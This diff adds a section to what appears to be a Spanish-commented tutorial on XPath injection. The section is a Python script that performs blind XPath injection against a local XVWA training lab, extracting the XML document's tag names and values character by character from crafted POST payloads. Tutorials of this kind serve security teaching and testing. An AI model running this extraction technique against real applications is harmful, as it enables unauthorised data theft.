@@ -664,3 +664,92 @@ Remember that in the variable string we have to add an space, in case do you wan
 
 I put **seventy** characters, if you want to optimize the time, remember you can use **string-length**
 
+# Script that show all
+
+**Credits for: Rafel Jurado**
+
+In Spanish
+
+````python
+#!/usr/bin/env python3
+
+import requests, string, signal, re
+
+signal.signal(signal.SIGINT, signal.SIG_DFL)
+
+url = "http://192.168.68.109/xvwa/vulnerabilities/xpath/"
+chars = string.ascii_letters + string.digits + ' ' + '.' + '$'
+header = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+tagname = ""
+for pos in range (1,10):
+    for char in chars:
+        data = f"search=3' and substring(name(/*[1]),{pos},1)='{char}&submit="
+        r = requests.post(url, data=data, headers=header)
+        if re.search('Bicerin', r.text):
+            tagname += char
+            break
+
+print(f"La etiqueta principal es: {tagname}\n")
+
+counter = 0
+for count in range (1,20):
+    data = f"search=3' and count(/*[1]/*)='{count}&submit="
+    r = requests.post(url, data=data, headers=header)
+    if re.search('Bicerin', r.text):
+        counter = count
+        break
+
+print(f"Hay {str(counter)} etiquetas secundarias.\n")
+
+name = ""
+subnames = {}
+subname = ""
+value = ""
+counter2 = 0
+for number in range (1,counter+1):
+    for pos in range (1,10):
+        for char in chars:
+            data = f"search=3' and substring(name(/*[1]/*[{number}]),{pos},1)='{char}&submit="
+            r = requests.post(url, data=data, headers=header)
+            if re.search('Bicerin', r.text):
+                name += char
+                break
+
+    for count in range (1,20):
+        data = f"search=3' and count(/*[1]/*[{number}]/*)='{count}&submit="
+        r = requests.post(url, data=data, headers=header)
+        if re.search('Bicerin', r.text):
+            counter2 = count
+            break
+
+    for number2 in range(1,counter2+1): 
+        for pos in range (1,10):
+            for char in chars:
+                data = f"search=3' and substring(name(/*[1]/*[{number}]/*[{number2}]),{pos},1)='{char}&submit="
+                r = requests.post(url, data=data, headers=header)
+                if re.search('Bicerin', r.text):
+                    subname += char
+                    break
+
+        for pos in range (1,30):
+            for char in chars:
+                data = f"search={number}' and substring({subname},{pos},1)='{char}&submit="
+                r = requests.post(url, data=data, headers=header)
+                if re.search(r'(?=<br>).*?<\/td>', r.text):
+                    value += char
+                    break
+
+        subnames.__setitem__(subname, value)
+        subname = ""
+        value = ""
+    
+    print(f"Etiqueta secundaria {number}:")
+    print("--------------------")
+    print(f"Nombre -> {name}\n")
+    name = ""
+    print(f"Subetiquetas -> {counter2} -> {subnames}")
+    subnames = {}
+    if number < counter:
+        print("--------------------")
+````
